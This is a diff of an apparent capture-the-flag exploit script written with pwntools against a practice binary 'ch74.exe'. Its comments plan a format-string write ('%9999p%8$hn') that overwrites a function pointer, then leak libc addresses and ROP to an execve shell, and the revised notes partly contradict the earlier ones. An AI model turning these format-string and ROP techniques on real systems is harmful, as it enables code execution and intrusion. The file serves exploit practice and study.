@@ -7,11 +7,7 @@ context.terminal = ['tmux','splitw' ,'-h']
 #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
 
 
-#p = process("ch74.exe")
-p = gdb.debug('./ch74.exe', '''
-break *main+197
-watch *0x403390
-''')
+
 
 '''
 0. Vulnerabilility
@@ -33,17 +29,12 @@ watch *0x403390
     - ASLR  : Information leak confirmed.
               Calculate offsets for ROP.
 
-3. Exploit Method
-    - use the read primitive to find where to write
-    - Use read primitive to leak stack & library locations.
-
-    Testing:
-    - Overwrite: "void (*pf)(int) = _exit;"
-    - Leak binary/library address + ROP
-    - No shellcode, if I can ROP mprotect() then I can ROP
-      execve('/bin/sh', 0, 0) instead.
-    - Return to main and fill up msg[1024], overflow msg into
-      _exit() variable.
+3. Exploit
+    - Leak binary/library address for offsets.
+    - Calculate library memory address offsets.
+    - Where to write: Overwrite memory address of: void (*pf)(int) = _exit;
+    - ROP a shell using read & write primitives
+        - How in windows?
 
 4. Libraries
         ntdll.dll => /cygdrive/c/Windows/SYSTEM32/ntdll.dll (0x7ffb228c0000)
@@ -52,31 +43,57 @@ watch *0x403390
         cygwin1.dll => /usr/bin/cygwin1.dll (0x180040000)
 
 '''
+'''
+Email = Read Primitive (leak) & What-To-Write
 
+1. 6 bytes Overwrite
+    %n  = 0x7f1400000009
+    DLL ->  |__|xxxxxxxx <- 4 bytes user control
+                            but not enough buffer to control it.
+2. 4 bytes Overwrite
+    %hn = 0x7fe60f9f0009
+    DLL ->  |______|xxxx <- 2 bytes user control
+
+3. 1.5 bytes are entropic
+   0x7fe60f9f0009
+           xx <- .5 byte entropy (unpredictable)
+
+4. .5 bytes entropy
+   1/15 tries will get the right address
+
+We can only read 12 bytes into email buffer. This isn't
+enough space to manipulate &pf()'s full stack address. 
+Using '%hn' fills out 6 bytes, then all we need to fill out is 2 bytes.
+'''
+
+'''
+LSB address limit: 0x270f (%9999p)
+- Good candidates:
+
+0x7f62df680700 <__libc_start_main_impl>
+0x7f62df750a50 <__GI___libc_read>
+0x7f62df750af0 <__GI___libc_write>
+0x7f62df750770 <__libc_open64>
+
+- Bad Candidate example:
+0x7f62df6a5920 <__libc_system>
+'''
+
+#p = process("ch74.exe")
+p = gdb.debug('./ch74.exe', '''
+break *main+197
+break *main+229
+''')
+
+main = p64(0x401146)
 heap_pf = p64(0x403390)
 
 # Name
 print(p.recvline())
 p.sendline(b'A' * 31)
 
-'''
-Email = Read Primitive (leak) & What-To-Write
-
-1. 6 bytes Overwrite
-    %n  = 0x7f1400000009
-    DLL ->  |__|xxxxxxxx <- 6 bytes user control
-
-2. 4 bytes Overwrite
-    %hn = 0x7fe60f9f0009
-    DLL ->  |______|xxxx <- 4 bytes user control
-
-We can only read 12 bytes into email buffer. This isn't
-enough space to manipulate &pf(). Using '%hn' fills out
-6 bytes, then all we need to fill out is 2 bytes.
-'''
-
-payload = b'%9p' + b'%8$hn'
-
+# Email
+payload = b'%9999p' + b'%8$hn'
 
 print(p.recvline())
 p.sendline(payload)
